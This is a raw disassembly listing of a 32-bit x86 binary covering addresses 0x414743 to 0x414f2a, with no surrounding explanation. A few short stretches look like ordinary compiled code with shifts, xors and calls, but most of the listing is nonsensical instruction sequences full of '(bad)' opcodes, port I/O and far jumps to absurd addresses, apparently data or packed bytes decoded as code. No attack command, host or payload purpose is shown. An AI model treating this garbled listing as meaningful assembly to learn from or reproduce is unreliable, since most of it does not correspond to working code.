  414743:	mov    ecx,DWORD PTR [ebp-0x80]
  414746:	xor    eax,edi
  414748:	xor    ecx,0xfffffffe
  41474b:	shr    eax,0x2
  41474e:	shl    ecx,0x1e
  414751:	or     ecx,eax
  414753:	mov    DWORD PTR [ebp-0x80],ecx
  414756:	lea    eax,[ebp-0x80]
  414759:	push   eax
  41475a:	mov    eax,DWORD PTR [ebp+0x10]
  41475d:	mov    ecx,DWORD PTR [ebp+0x14]
  414760:	shrd   eax,ecx,0x2
  414764:	shr    ecx,0x2
  414767:	mov    ecx,DWORD PTR [ebp+0x10]
  41476a:	mov    edx,DWORD PTR [ebp+0x14]
  41476d:	xor    eax,esi
  41476f:	xor    edx,edx
  414771:	or     eax,edx
  414773:	push   eax
  414774:	mov    eax,ds:0x4226d8
  414779:	mov    edi,0x42261e
  41477e:	push   edi
  41477f:	push   DWORD PTR [eax]
  414781:	shl    ecx,0x1e
  414784:	call   0x41b447
  414789:	lea    eax,[ebp-0x80]
  41478c:	push   eax
  41478d:	mov    eax,DWORD PTR [ebp+0x10]
  414790:	jmp    0x414ac9
  414795:	pop    ds
  414796:	cmp    eax,0xaf9fd01d
  41479b:	das    
  41479c:	lods   eax,DWORD PTR ds:[esi]
  41479d:	sbb    DWORD PTR [esi+0x2319a4c7],edi
  4147a3:	(bad)  cs:[ebx-0x12414162]
  4147aa:	les    edi,FWORD PTR [esi-0x759c1942]
  4147b0:	mov    WORD PTR [ecx+0x56],ds
  4147b3:	push   es
  4147b4:	or     BYTE PTR [eax+ecx*1],cl
  4147b7:	cmp    DWORD PTR [eax+0x5085869e],0x7d70550d
  4147c1:	cmp    BYTE PTR [edx],bh
  4147c3:	dec    ebx
  4147c4:	or     ah,BYTE PTR [eax]
  4147c6:	or     al,0x70
  4147c8:	sub    al,0xbd
  4147ca:	sub    ebp,edi
  4147cc:	dec    edi
  4147cd:	pop    esi
  4147ce:	or     BYTE PTR ds:0xc356e258,cl
  4147d4:	aas    
  4147d5:	lock mov ebx,0xaa584b8c
  4147db:	fldenv [ebx+ebp*1]
  4147de:	int3   
  4147df:	cmp    BYTE PTR ds:0x4613221d,dl
  4147e5:	dec    ecx
  4147e6:	mov    cl,0x46
  4147e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147e9:	dec    esi
  4147ea:	inc    edi
  4147eb:	stc    
  4147ec:	adc    ch,ah
  4147ee:	add    al,0x59
  4147f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147f1:	std    
  4147f2:	aaa    
  4147f3:	pop    eax
  4147f4:	jnp    0x41482d
  4147f6:	pop    edi
  4147f7:	push   es
  4147f8:	out    dx,eax
  4147f9:	(bad)  
  4147fa:	ins    BYTE PTR es:[edi],dx
  4147fb:	loope  0x4147d1
  4147fd:	mov    ch,BYTE PTR [ebx+edx*4+0x1ed081dc]
  414804:	xor    DWORD PTR [ecx+0x7074693c],0xfffffff7
  41480b:	adc    eax,0x62c39c82
  414810:	mov    bl,0x3e
  414812:	lods   eax,DWORD PTR ds:[esi]
  414813:	mov    edx,0x51118b31
  414818:	dec    edi
  414819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41481a:	repz icebp 
  41481c:	dec    edi
  41481d:	and    DWORD PTR [ecx],esi
  41481f:	cmp    edx,DWORD PTR [edx-0x52]
  414822:	xor    dh,BYTE PTR [ebx+ebx*4-0x333f8c38]
  414829:	push   ebp
  41482a:	adc    eax,0xa86e632d
  41482f:	jbe    0x41486c
  414831:	jg     0x414830
  414833:	pop    ecx
  414834:	loop   0x4147e2
  414836:	push   cs
  414837:	cli    
  414838:	scas   al,BYTE PTR es:[edi]
  414839:	dec    ebp
  41483a:	sar    DWORD PTR [edi+0x382a4a42],cl
  414840:	lea    edx,[eax]
  414842:	dec    eax
  414843:	(bad)  
  414844:	or     al,BYTE PTR [edi-0x73e0e707]
  41484a:	out    0xcf,al
  41484c:	repz cmp BYTE PTR [ebp-0x42],bl
  414850:	into   
  414851:	lods   eax,DWORD PTR ds:[esi]
  414852:	pop    ds
  414853:	lds    eax,FWORD PTR ds:0x72a77254
  414859:	adc    ch,BYTE PTR [edi]
  41485b:	add    BYTE PTR [edi+0x6e572ee4],ch
  414861:	xchg   edx,eax
  414862:	and    esp,DWORD PTR [ebx]
  414864:	outs   dx,BYTE PTR ds:[esi]
  414865:	dec    edi
  414866:	mov    cl,BYTE PTR [ebp-0x197ce2c9]
  41486c:	ja     0x4148e2
  41486e:	add    DWORD PTR [ebp+eax*1+0x3c],0xfffffff1
  414873:	ins    DWORD PTR es:[edi],dx
  414874:	imul   DWORD PTR [ecx+0x43]
  414877:	inc    esi
  414878:	ficomp DWORD PTR [ebx+esi*2+0x2108606f]
  41487f:	ret    0x9ad4
  414882:	cmp    al,0x5a
  414884:	dec    ebx
  414885:	inc    edi
  414886:	sub    eax,0x1d71f6cb
  41488b:	in     eax,0x9c
  41488d:	mov    bh,0x4
  41488f:	in     al,0xab
  414891:	arpl   WORD PTR [esi+0x2a],sp
  414894:	(bad)  
  414895:	inc    ebx
  414896:	aam    0xac
  414898:	jb     0x414918
  41489a:	fadd   DWORD PTR [eax]
  41489c:	mov    ds:0x73ca5172,al
  4148a1:	adc    al,0x70
  4148a3:	dec    esi
  4148a4:	cli    
  4148a5:	pop    eax
  4148a6:	fcomp  DWORD PTR [ebp-0x49]
  4148a9:	test   eax,0xfb17c9ac
  4148ae:	imul   DWORD PTR [ebp+ecx*4+0x56]
  4148b2:	daa    
  4148b3:	ja     0x41488a
  4148b5:	push   edi
  4148b6:	addr16 mov al,0x23
  4148b9:	imul   ebx,DWORD PTR [ebp+0x6775fe1f],0x68
  4148c0:	aam    0x27
  4148c2:	inc    edi
  4148c4:	adc    BYTE PTR [ebp-0x14d12c17],bl
  4148ca:	and    BYTE PTR [eax-0x2d1be6a9],0x10
  4148d1:	cli    
  4148d2:	push   edx
  4148d3:	sbb    eax,0x2f7e98ea
  4148d8:	gs retf 0xff07
  4148dc:	pop    eax
  4148dd:	sbb    DWORD PTR [edx+0x1fb16b7a],0xaabaf0a7
  4148e7:	xchg   ebp,eax
  4148e8:	mov    ah,0xf
  4148ea:	sbb    DWORD PTR [ebx+0x8],edx
  4148ed:	push   ds
  4148ee:	sub    BYTE PTR [ebp-0xf],al
  4148f1:	mov    bh,0xee
  4148f3:	ins    DWORD PTR es:[edi],dx
  4148f4:	stos   DWORD PTR es:[edi],eax
  4148f5:	or     dh,BYTE PTR [esi+0x5a7a950]
  4148fb:	jmp    0xfc59556c
  414900:	repnz push 0x6
  414903:	dec    eax
  414904:	mov    ch,0x33
  414906:	xor    eax,0x75942d41
  41490b:	je     0x4148fe
  41490d:	int    0x6d
  41490f:	popa   
  414910:	xor    BYTE PTR [ecx+esi*2-0x37ce668f],bh
  414917:	jnp    0x4148b5
  414919:	xchg   ebx,eax
  41491a:	inc    ecx
  41491b:	or     eax,0x9cd77dd9
  414920:	adc    DWORD PTR [edx],edx
  414922:	loopne 0x4148a6
  414924:	xchg   edi,eax
  414925:	mov    al,0x4c
  414927:	adc    al,0x27
  414929:	out    dx,al
  41492a:	jns    0x41493b
  41492c:	lods   eax,DWORD PTR ds:[esi]
  41492d:	sar    BYTE PTR [ebp+0x1f7e5032],1
  414933:	xor    al,0xd2
  414935:	cmp    bl,BYTE PTR [esi-0x2e]
  414938:	push   esp
  414939:	jnp    0x414908
  41493b:	mov    esi,0x2345fad1
  414940:	aaa    
  414941:	jmp    0x3c9:0x48f26afa
  414948:	or     ah,BYTE PTR [edi+0x35]
  41494b:	ficom  DWORD PTR [eax-0x3c]
  41494e:	cmp    bh,bh
  414950:	mov    ah,0xbf
  414952:	stos   BYTE PTR es:[edi],al
  414953:	push   ss
  414954:	mov    al,ds:0x355fb995
  414959:	idiv   BYTE PTR [ebp-0x4013c6b0]
  41495f:	lock mov ebp,0x5d6b541c
  414966:	inc    eax
  414967:	cmp    ah,BYTE PTR [ebp-0x75]
  41496a:	cmp    al,0xca
  41496c:	(bad)  
  41496e:	outs   dx,DWORD PTR ds:[esi]
  41496f:	sbb    eax,0x789c6017
  414974:	outs   dx,DWORD PTR ds:[esi]
  414975:	inc    edx
  414976:	cs cmc 
  414978:	arpl   WORD PTR [eax+0x58],di
  41497b:	or     eax,0xa182a0f2
  414980:	cmp    DWORD PTR [edx+0x4a3e8455],ebx
  414986:	xor    ebp,eax
  414988:	arpl   si,si
  41498a:	lock inc ecx
  41498c:	fs retf 
  41498e:	daa    
  41498f:	mov    al,ds:0x9f697727
  414994:	aad    0x8a
  414996:	pop    es
  414997:	adc    BYTE PTR [ebx],bh
  414999:	ror    BYTE PTR [ebx-0x48],0x5a
  41499d:	mov    ebp,0x863036d3
  4149a2:	rol    DWORD PTR [ecx],0x87
  4149a5:	out    dx,al
  4149a6:	ss push ecx
  4149a8:	mov    ebx,DWORD PTR [ebx+0x2f00d16c]
  4149ae:	int    0x9e
  4149b0:	dec    esi
  4149b1:	loope  0x4149ed
  4149b3:	xor    BYTE PTR [esi],bh
  4149b5:	lods   al,BYTE PTR ds:[esi]
  4149b6:	hlt    
  4149b7:	call   0x3e097814
  4149bc:	mov    edx,0x84055ae1
  4149c1:	adc    BYTE PTR ds:0xfb793595,bl
  4149c7:	dec    ebx
  4149c8:	call   0x9964:0x5a42d619
  4149cf:	lock ret 
  4149d1:	test   eax,0xb537ca7f
  4149d6:	dec    esi
  4149d7:	sahf   
  4149d8:	jmp    eax
  4149da:	ja     0x4149b8
  4149dc:	fcom   DWORD PTR [ebx*8+0x1e4aa96a]
  4149e3:	or     eax,0xca43c231
  4149e8:	mov    dl,0x69
  4149ea:	inc    ebp
  4149eb:	mov    BYTE PTR [eax-0x71],al
  4149ee:	lods   al,BYTE PTR ds:[esi]
  4149ef:	clc    
  4149f0:	mov    eax,ds:0xe370292f
  4149f5:	gs jbe 0x414a74
  4149f8:	cmp    BYTE PTR [edx-0x1c],ch
  4149fb:	mov    dh,0xe3
  4149fd:	fucomp st(5)
  4149ff:	lahf   
  414a00:	dec    ebp
  414a01:	addr16 pop esi
  414a03:	dec    ebp
  414a04:	int    0xfa
  414a06:	mov    edi,0x8b0619c7
  414a0b:	fmul   st,st(2)
  414a0d:	push   0xffffff80
  414a0f:	clc    
  414a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a11:	je     0x4149d0
  414a13:	pop    ss
  414a14:	fmul   DWORD PTR [esi+0x53]
  414a17:	xchg   edx,eax
  414a18:	sahf   
  414a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a1a:	out    0x2c,eax
  414a1c:	xchg   DWORD PTR [edi],edx
  414a1e:	daa    
  414a1f:	mov    dl,0x56
  414a21:	(bad)  
  414a22:	aas    
  414a23:	in     al,dx
  414a24:	repz cmp ah,BYTE PTR [eax+0x68beaffb]
  414a2b:	xor    edi,DWORD PTR [edx+0x67]
  414a2e:	cmc    
  414a2f:	stos   BYTE PTR es:[edi],al
  414a30:	pop    ebp
  414a31:	ret    0x7e6c
  414a34:	lods   al,BYTE PTR ds:[esi]
  414a35:	into   
  414a36:	dec    BYTE PTR [ebx-0x40705de7]
  414a3c:	ja     0x414a40
  414a3e:	push   es
  414a3f:	sbb    al,0x89
  414a41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a42:	or     eax,DWORD PTR [ebx-0x3a]
  414a45:	sub    cl,BYTE PTR [ebx]
  414a47:	jbe    0x4149e0
  414a49:	loop   0x414a3b
  414a4b:	mov    dl,0x11
  414a4d:	popf   
  414a4e:	push   eax
  414a4f:	cwde   
  414a50:	pop    edx
  414a51:	imul   edi,DWORD PTR [ebp+0x6b],0x73
  414a55:	push   ebx
  414a56:	jmp    DWORD PTR [eax]
  414a58:	jge    0x4149e3
  414a5a:	test   al,0xe5
  414a5c:	call   0x7cf2:0xdf7ff62e
  414a63:	mov    BYTE PTR [ebx+0x38],bh
  414a66:	pop    esi
  414a67:	fcomi  st,st(2)
  414a69:	mov    dh,0xfe
  414a6b:	adc    BYTE PTR [eax+0x79],dh
  414a6e:	icebp  
  414a6f:	iret   
  414a70:	push   esp
  414a71:	cmp    DWORD PTR [eax+0xe],ecx
  414a74:	fst    QWORD PTR [edx-0x56]
  414a77:	sub    eax,0x58602514
  414a7c:	mov    bl,0x2
  414a7e:	(bad)  
  414a80:	push   ecx
  414a81:	loop   0x414a6d
  414a83:	lods   eax,DWORD PTR ds:[esi]
  414a84:	pop    edi
  414a85:	mov    dl,0x1e
  414a87:	iret   
  414a88:	xchg   ebp,eax
  414a89:	add    edx,DWORD PTR [edi-0x62]
  414a8c:	je     0x414a7d
  414a8e:	aad    0x47
  414a90:	pop    ebp
  414a91:	sahf   
  414a92:	inc    ebx
  414a93:	les    ebp,FWORD PTR [esi]
  414a95:	xchg   esi,eax
  414a96:	loope  0x414adc
  414a98:	inc    ebx
  414a99:	pushf  
  414a9a:	int3   
  414a9b:	push   edi
  414a9c:	repnz pop edi
  414a9e:	xor    DWORD PTR [ebx-0x44],eax
  414aa1:	ds ret 
  414aa3:	mov    ebp,0x9f7a3211
  414aa8:	dec    eax
  414aa9:	gs out dx,al
  414aab:	add    al,0x3
  414aad:	dec    edi
  414aae:	ss jnp 0x414a5a
  414ab1:	xchg   ebx,eax
  414ab2:	sub    al,0x95
  414ab4:	add    al,0x30
  414ab6:	mov    ah,0xbe
  414ab8:	bound  edx,QWORD PTR [ebx]
  414aba:	inc    eax
  414abb:	je     0x414a42
  414abd:	adc    edi,0x14efa886
  414ac3:	imul   ecx,DWORD PTR [edx+0x25c0301],0xf144d8b
  414acd:	lods   al,BYTE PTR ds:[esi]
  414ace:	enter  0xc102,0xe9
  414ad2:	add    cl,BYTE PTR [ebx+0x558b104d]
  414ad8:	adc    al,0x33
  414ada:	(bad)  
  414adb:	xor    edx,edx
  414add:	or     eax,edx
  414adf:	push   eax
  414ae0:	mov    eax,ds:0x4226d8
  414ae5:	push   edi
  414ae6:	push   DWORD PTR [eax]
  414ae8:	shl    ecx,0x1e
  414aeb:	call   0x41b447
  414af0:	mov    eax,DWORD PTR [ebp-0x3c]
  414af3:	mov    eax,DWORD PTR [ebp-0x2c]
  414af6:	mov    edi,DWORD PTR [ebp-0x24]
  414af9:	mov    eax,DWORD PTR [ebp-0x30]
  414afc:	mov    ecx,edi
  414afe:	mov    DWORD PTR [ebp-0x1c],eax
  414b01:	rol    ecx,0x2
  414b04:	mov    eax,0xa5069bae
  414b09:	xor    ecx,eax
  414b0b:	jmp    0x414e44
  414b10:	fisttp WORD PTR [eax+0x5aac5a8c]
  414b16:	xor    BYTE PTR [esp+edx*1+0x589e14bc],bh
  414b1d:	imul   edx,DWORD PTR [esi-0x2f],0xffffffdb
  414b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b22:	mov    esi,0xbec4edbe
  414b27:	mov    esi,0xd92b3eee
  414b2c:	fisttp WORD PTR ds:0x637262c8
  414b32:	cmp    eax,0xd11207a9
  414b37:	std    
  414b38:	stos   DWORD PTR es:[edi],eax
  414b39:	ret    0x759a
  414b3c:	(bad)  
  414b3d:	imul   esp,esi,0x9966c5ff
  414b43:	imul   ebp,DWORD PTR [ebx],0x3fe58590
  414b49:	push   ebp
  414b4a:	mov    ebx,0x187390f4
  414b4f:	xor    ebp,ebx
  414b51:	adc    ecx,DWORD PTR [edx]
  414b53:	in     eax,0x33
  414b55:	ret    0xae28
  414b58:	iret   
  414b59:	xor    ebx,eax
  414b5b:	enter  0x5b7c,0xa6
  414b5f:	push   ds
  414b60:	xchg   esp,eax
  414b61:	sbb    eax,esp
  414b63:	test   DWORD PTR [ebp+0x75],esi
  414b66:	lods   al,BYTE PTR ds:[esi]
  414b67:	nop
  414b68:	rol    DWORD PTR [esi-0xc],cl
  414b6b:	call   0x67b5:0x9929a0ac
  414b72:	gs int 0x71
  414b75:	sub    DWORD PTR [ecx+0x472f5408],eax
  414b7b:	stos   DWORD PTR es:[edi],eax
  414b7c:	jns    0x414b17
  414b7e:	bound  ebp,QWORD PTR ds:0x66e44ec9
  414b84:	mov    ebp,0x5354361e
  414b89:	add    al,ch
  414b8b:	popf   
  414b8c:	retf   
  414b8d:	(bad)  
  414b8f:	fidivr DWORD PTR [ecx+0x4a]
  414b92:	fwait
  414b93:	push   0x382ee6be
  414b98:	dec    ebx
  414b99:	add    bh,BYTE PTR [eax+eiz*2+0x3def58f7]
  414ba0:	jle    0x414b9a
  414ba2:	js     0x414b57
  414ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ba5:	xor    edi,esi
  414ba7:	sub    eax,0xa192c7ad
  414bac:	mov    ds:0x7b61e664,eax
  414bb1:	inc    edx
  414bb2:	dec    eax
  414bb3:	sbb    al,0xc0
  414bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bb6:	iret   
  414bb7:	retf   0xa4ee
  414bba:	adc    eax,DWORD PTR [eax-0x2d]
  414bbd:	and    esp,0xffffffab
  414bc0:	rol    al,0xa3
  414bc3:	(bad)  
  414bc4:	cmp    al,0x1c
  414bc6:	adc    al,0xa4
  414bc8:	in     eax,0xab
  414bca:	and    BYTE PTR [ecx-0x4ca1ba0c],dl
  414bd0:	or     esp,DWORD PTR [esi]
  414bd2:	dec    edx
  414bd3:	mov    ds:0x804e0e36,eax
  414bd8:	jo     0x414c50
  414bda:	xchg   ebp,eax
  414bdb:	pop    edi
  414bdc:	add    al,0xe1
  414bde:	and    DWORD PTR [ecx],ecx
  414be0:	not    esp
  414be2:	mov    eax,0x1ebbe769
  414be7:	xchg   ebp,eax
  414be8:	mov    ch,0xbc
  414bea:	fmul   QWORD PTR ds:0xdf50c817
  414bf0:	les    esi,FWORD PTR [ecx-0x7e]
  414bf3:	adc    eax,0x7bb24d57
  414bf8:	sub    eax,0x27032f07
  414bfd:	cmp    eax,DWORD PTR [edx-0x40dc30e8]
  414c03:	push   esi
  414c04:	ss sub al,0x31
  414c07:	lods   al,BYTE PTR ds:[esi]
  414c08:	jo     0x414beb
  414c0a:	push   ds
  414c0b:	(bad)  [ebx]
  414c0d:	push   ebx
  414c0e:	dec    esi
  414c0f:	sbb    DWORD PTR [eax+eax*4-0x4ab2f03a],esi
  414c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c17:	or     eax,0xcb38f10c
  414c1c:	pop    edx
  414c1d:	(bad)  
  414c1e:	jb     0x414c2f
  414c20:	in     eax,0x9f
  414c22:	inc    edx
  414c23:	pop    eax
  414c24:	fdiv   QWORD PTR [ebx-0x20210cdd]
  414c2a:	adc    BYTE PTR [edi-0x55217428],ch
  414c30:	ins    BYTE PTR es:[di],dx
  414c32:	mov    ?,WORD PTR [ecx-0x6d30ac10]
  414c38:	fist   DWORD PTR [ecx]
  414c3a:	ds (bad) 
  414c3c:	mov    edi,0xb8d0c239
  414c41:	imul   esp,DWORD PTR [edi+eax*2],0x36
  414c45:	add    edx,DWORD PTR [edi-0x68]
  414c48:	or     DWORD PTR [esi-0xd9a4612],ebx
  414c4e:	push   ds
  414c4f:	mov    bh,0x60
  414c51:	loopne 0x414c60
  414c53:	add    al,0x15
  414c55:	jmp    0x414cc7
  414c57:	push   ebp
  414c58:	fild   WORD PTR [eax-0x53425e2c]
  414c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c5f:	and    eax,0xb7d27760
  414c64:	pop    ds
  414c65:	(bad)  
  414c66:	sub    BYTE PTR [edi],ah
  414c68:	push   ecx
  414c69:	(bad)  
  414c6a:	nop
  414c6b:	inc    edx
  414c6c:	xchg   esi,eax
  414c6d:	adc    cl,cl
  414c6f:	add    BYTE PTR [ebx-0x71],al
  414c72:	mov    dl,0x91
  414c74:	adc    BYTE PTR [eax-0x12],bh
  414c77:	mov    ds:0xd51bb3d7,al
  414c7c:	sub    bl,dh
  414c7e:	aas    
  414c7f:	dec    ebx
  414c80:	inc    edi
  414c81:	push   ss
  414c82:	inc    edx
  414c83:	gs sti 
  414c85:	adc    BYTE PTR [esi+0x5ecd90e5],dh
  414c8b:	mov    cl,0x9a
  414c8d:	imul   BYTE PTR [ebx+0x5e95ab8a]
  414c93:	pop    ebx
  414c94:	rol    BYTE PTR [eax+0x3a955c42],0x7c
  414c9b:	int    0xef
  414c9d:	into   
  414c9e:	int3   
  414c9f:	fldenv [eax-0x163a22e6]
  414ca5:	pop    eax
  414ca6:	adc    eax,0x362fa6da
  414cab:	dec    edx
  414cac:	mov    al,0xa
  414cae:	cld    
  414caf:	aas    
  414cb0:	jp     0x414c39
  414cb2:	push   cs
  414cb3:	fldenv [esi-0x256bade8]
  414cb9:	cwde   
  414cba:	(bad)
  414cbf:	add    eax,0x4f2f2735
  414cc4:	and    eax,0x6af5e5ad
  414cc9:	aam    0xf2
  414ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ccc:	bound  edi,QWORD PTR [ebx+0x44d3e70c]
  414cd2:	adc    DWORD PTR [eax+0x14],edi
  414cd5:	cld    
  414cd6:	sahf   
  414cd7:	add    DWORD PTR ds:0x1200240e,edx
  414cdd:	mov    ds:0x4209778,al
  414ce2:	fnstsw WORD PTR [ebp-0x21]
  414ce5:	retf   
  414ce6:	fidivr WORD PTR [ebx+0x2ce27da9]
  414cec:	fnsave [edx+edi*4]
  414cef:	push   ebp
  414cf0:	add    al,0xec
  414cf2:	cmc    
  414cf3:	inc    eax
  414cf4:	pop    eax
  414cf5:	(bad)  
  414cf6:	mov    dl,0x2
  414cf8:	test   al,bl
  414cfa:	adc    al,0x7c
  414cfc:	xchg   ebp,eax
  414cfd:	and    eax,0x9f8d4b99
  414d02:	jnp    0x414ca1
  414d04:	inc    edx
  414d05:	lds    ebx,FWORD PTR [ebx]
  414d07:	mov    ebx,DWORD PTR [ebx+0x50]
  414d0a:	test   DWORD PTR [edx-0xd],ebx
  414d0d:	lea    edi,[eax]
  414d0f:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d11:	push   edx
  414d12:	aad    0x5a
  414d14:	call   0xb054:0x3d0b94a8
  414d1b:	dec    edi
  414d1c:	idiv   ah
  414d1e:	jo     0x414cb1
  414d20:	pop    ds
  414d21:	cdq    
  414d22:	pop    ebp
  414d23:	jne    0x414d19
  414d25:	cmp    ebp,esi
  414d27:	aam    0x8a
  414d29:	push   esp
  414d2a:	pop    esi
  414d2b:	or     ecx,edx
  414d2d:	push   0xffffff9d
  414d2f:	mov    eax,ds:0x1122c938
  414d34:	out    0xb,al
  414d36:	bound  edi,QWORD PTR [esi-0x6acc8eed]
  414d3c:	pop    edi
  414d3d:	ins    DWORD PTR es:[edi],dx
  414d3e:	mov    eax,ds:0x6a3230e0
  414d43:	lds    esi,FWORD PTR [ecx+0x13]
  414d46:	fcom   QWORD PTR [esi+0x2e75d7c9]
  414d4c:	in     eax,0xbe
  414d4e:	mov    ah,0xca
  414d50:	sub    cl,cl
  414d52:	out    dx,al
  414d53:	(bad)
  414d56:	push   ss
  414d57:	(bad)  
  414d58:	push   esp
  414d59:	scas   al,BYTE PTR es:[edi]
  414d5a:	add    BYTE PTR [ecx],al
  414d5c:	sub    DWORD PTR [ebx],edi
  414d5e:	cmp    eax,0x9b3ba7db
  414d63:	or     eax,0x424bd9f6
  414d68:	gs jno 0x414d5c
  414d6b:	adc    ebp,DWORD PTR [ebp+eax*8-0x53]
  414d6f:	mov    ebx,0xa5d7654f
  414d74:	inc    edx
  414d75:	mov    ds:0xa57d77b8,eax
  414d7a:	pop    esp
  414d7b:	dec    esi
  414d7c:	dec    esp
  414d7d:	js     0x414d83
  414d7f:	sar    cl,1
  414d81:	cmp    eax,0x3282c640
  414d86:	dec    esi
  414d87:	adc    eax,DWORD PTR [edx]
  414d89:	push   0xde5b6950
  414d8e:	aaa    
  414d8f:	inc    ebp
  414d90:	mov    ebp,0xf7c8465d
  414d95:	cmp    eax,0xf7013c7d
  414d9a:	mov    ds:0x3b73b86b,al
  414d9f:	or     DWORD PTR [esp+ecx*8+0x561b3e6],esi
  414da6:	xchg   ecx,eax
  414da7:	adc    bl,BYTE PTR [edx]
  414da9:	cld    
  414daa:	adc    BYTE PTR [edx-0x1e13e30c],dl
  414db0:	fcmove st,st(0)
  414db2:	or     BYTE PTR [ebp+ebx*8-0x3ad1d69a],bl
  414db9:	scas   eax,DWORD PTR es:[edi]
  414dba:	sub    DWORD PTR [edi-0x6ac3dc61],eax
  414dc0:	pop    ebp
  414dc1:	(bad)  
  414dc3:	push   esp
  414dc4:	mov    dh,0xe2
  414dc6:	push   ds
  414dc7:	imul   ebp,edx,0xffffffb1
  414dca:	fs jae 0x414d89
  414dcd:	mov    ebp,DWORD PTR [ebx+0x7b]
  414dd0:	mov    ebp,0x70f1e602
  414dd5:	mov    ds:0x54c619eb,eax
  414dda:	sub    ch,cl
  414ddc:	rol    cl,0xcd
  414ddf:	dec    ebp
  414de0:	add    BYTE PTR [ebp-0x5557b14],bh
  414de6:	xchg   esi,eax
  414de7:	sbb    esp,edi
  414de9:	sub    al,0x3d
  414deb:	dec    edx
  414dec:	popf   
  414ded:	out    dx,eax
  414dee:	adc    dh,0x39
  414df1:	in     eax,dx
  414df2:	je     0x414d75
  414df4:	cmp    DWORD PTR [eax-0x344028e7],eax
  414dfa:	sbb    DWORD PTR [ebx-0x6a],ebp
  414dfd:	lds    edi,FWORD PTR [edx-0x5e]
  414e00:	jmp    0x414e02
  414e02:	ffreep st(3)
  414e04:	daa    
  414e05:	jns    0x414e35
  414e07:	out    dx,al
  414e08:	mov    eax,0x8b341fdb
  414e0d:	std    
  414e0e:	inc    esi
  414e0f:	inc    eax
  414e10:	aas    
  414e11:	jo     0x414e20
  414e13:	jmp    0x414df5
  414e15:	(bad)  
  414e16:	fnstenv [edi+0x392e300a]
  414e1c:	mov    bh,0x0
  414e1e:	(bad)
  414e21:	mov    esi,0xfea9ae26
  414e26:	and    eax,0x9249b20a
  414e2b:	sahf   
  414e2c:	lahf   
  414e2d:	sub    eax,0x37898d3
  414e32:	and    BYTE PTR [eax],0xe6
  414e35:	xor    bl,BYTE PTR [edx-0x20]
  414e38:	sar    BYTE PTR [edx-0x36],0xe0
  414e3c:	push   cs
  414e3d:	dec    ecx
  414e3e:	mov    cl,0x54
  414e40:	mov    eax,DWORD PTR [eax]
  414e42:	in     eax,dx
  414e43:	jp     0x414e80
  414e45:	enter  0x34e9,0x3
  414e49:	add    BYTE PTR [eax],al
  414e4b:	call   0xa44dd255
  414e50:	mov    WORD PTR [edi+0x2a],fs
  414e53:	mov    eax,0x389e22a6
  414e58:	xor    BYTE PTR [esi-0x31],bh
  414e5b:	or     al,0xaa
  414e5d:	mov    esi,0xbec4edbe
  414e62:	mov    esi,0xc1c5af6d
  414e67:	mov    bh,0xd2
  414e69:	and    BYTE PTR [ebx+0x1edf4266],al
  414e6f:	mov    dh,0xa3
  414e71:	int    0x2c
  414e73:	call   0x9c67:0xef9db330
  414e7a:	inc    edx
  414e7b:	jge    0x414e82
  414e7d:	jle    0x414ed3
  414e7f:	int    0x4a
  414e81:	fcomp  QWORD PTR [edi+0x0]
  414e84:	stos   BYTE PTR es:[edi],al
  414e85:	fcomp  QWORD PTR [edi]
  414e87:	jno    0x414ec0
  414e89:	(bad)  
  414e8a:	push   ds
  414e8b:	xlat   BYTE PTR ds:[ebx]
  414e8c:	inc    edi
  414e8d:	push   ds
  414e8e:	sbb    al,0x36
  414e90:	xchg   ebx,edx
  414e92:	(bad)  
  414e93:	addps  xmm4,XMMWORD PTR [esi+0x1d]
  414e97:	loopne 0x414e54
  414e99:	push   0x78
  414e9b:	ds data16 sahf 
  414e9e:	or     al,0x9d
  414ea0:	pop    edx
  414ea1:	mov    ecx,0xdb3f71c6
  414ea6:	push   es
  414ea7:	mov    cl,0x41
  414ea9:	mov    dl,0xfd
  414eab:	pop    ds
  414eac:	xor    bh,BYTE PTR [esp+esi*4+0x40]
  414eb0:	jns    0x414e78
  414eb2:	lock aas 
  414eb4:	sub    di,WORD PTR [esi-0x3d]
  414eb8:	out    0x5d,al
  414eba:	mov    ebx,0x107300b0
  414ebf:	add    eax,0x5972bd5a
  414ec4:	enter  0xa0be,0x2
  414ec8:	dec    eax
  414ec9:	fidivr DWORD PTR [ecx+0x75]
  414ecc:	pop    esp
  414ecd:	stc    
  414ece:	das    
  414ecf:	mov    WORD PTR [eax+0x7a],ds
  414ed2:	std    
  414ed3:	mov    esp,0x638e6ba2
  414ed8:	mov    ds:0xfd8041f,al
  414edd:	inc    eax
  414ede:	dec    ecx
  414edf:	aam    0x92
  414ee1:	jmp    0x1051b037
  414ee6:	cmp    DWORD PTR [ecx],ecx
  414ee8:	add    BYTE PTR cs:[edi+0x67],dh
  414eec:	enter  0x6550,0xad
  414ef0:	pop    ebx
  414ef1:	fisubr DWORD PTR [edx]
  414ef3:	lock fwait
  414ef5:	xchg   ebp,eax
  414ef6:	push   ebx
  414ef7:	xchg   DWORD PTR [ebx-0x71e773c5],ebp
  414efd:	inc    eax
  414efe:	shr    DWORD PTR [edx],cl
  414f00:	pop    edx
  414f01:	mov    bl,0xba
  414f03:	jne    0x414e86
  414f05:	adc    al,0x8c
  414f07:	(bad)  
  414f08:	daa    
  414f09:	dec    esp
  414f0a:	cs popf 
  414f0c:	arpl   WORD PTR [esi-0x5],cx
  414f0f:	sbb    cl,BYTE PTR [ebp+ebx*1+0x7f6c1b2d]
  414f16:	adc    eax,0xd9616135
  414f1b:	retf   
  414f1c:	in     al,0xd9
  414f1e:	enter  0x1973,0x40
  414f22:	xor    eax,DWORD PTR [edi+0x7f]
  414f25:	push   0x50f555a7
  414f2a:	adc    dh,BYTE PTR [ebx-0x6f]
